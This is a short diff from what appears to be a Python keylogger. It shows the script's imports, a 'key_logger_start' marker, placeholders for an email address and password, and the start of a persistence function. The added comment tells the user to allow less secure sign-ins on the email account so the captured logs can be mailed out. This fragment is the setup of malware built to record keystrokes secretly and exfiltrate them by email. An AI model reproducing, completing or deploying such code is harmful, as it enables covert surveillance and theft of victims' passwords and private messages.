@@ -8,6 +8,7 @@ import subprocess
 import time
 
 store_keys='key_logger_start'
+#make sure you email account turn of login less secure site,that's importand for log and send mail from the account.
 email="#give you mail id"
 password="#enter you password of Given previous mail id"
 def presistencs():
